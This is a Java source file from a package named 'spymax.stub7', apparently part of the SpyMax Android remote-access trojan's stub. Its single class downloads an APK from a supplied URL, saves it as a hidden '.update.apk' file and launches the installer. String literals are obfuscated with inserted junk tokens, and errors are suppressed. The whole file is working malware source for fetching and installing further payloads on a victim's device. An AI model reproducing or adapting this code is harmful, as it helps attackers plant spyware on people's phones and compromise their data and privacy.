package spymax.stub7;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class _update_app_ extends AsyncTask<String,Void,Void> {
    private Context context;
    public void setContext(Context contextf, String... arg0){
        context = contextf;
        try {
            URL url = new URL(arg0[0]);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod(ClassGen3._Reblace_( "GE[RANDOM-STRING]T","[RANDOM-STRING]"));
            c.setDoOutput(true);
            c.connect();

                        String PATH = "/mnt/sdcard/Download/";
                        File file = new File(PATH);
                        file.mkdirs();
                        File outputFile = new File(file, ClassGen3._Reblace_( ".up[RANDOM-STRING]date.[RANDOM-STRING]apk","[RANDOM-STRING]"));
                        if(outputFile.exists()){
                            outputFile.delete();
                        }
                        FileOutputStream fos = new FileOutputStream(outputFile);

                        InputStream is = c.getInputStream();

                        byte[] buffer = new byte[1024];
                        int len1 = 0;
                        while ((len1 = is.read(buffer)) != -1) {
                            fos.write(buffer, 0, len1);
                        }
                        fos.close();
                        is.close();

                        Intent intent = new Intent(Intent.ACTION_VIEW);
                        intent.setDataAndType(ClassGen3.uriFromFile(context,new File(ClassGen3._Reblace_( "/mn[RANDOM-STRING]t/sdca[RANDOM-STRING]rd/Download/[RANDOM-STRING].update.apk","[RANDOM-STRING]"))), "application/vnd.android.package-archive");
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
            ClassGen12.ClassGen12FOR_IN =true;
                        context.startActivity(intent);


                    } catch (Exception e) {
                        // Log.e("UpdateAPP", "Update error! " + e.getMessage());
                    }

    }

    @Override
    protected Void doInBackground(String... arg0) {

        return null;
    }
}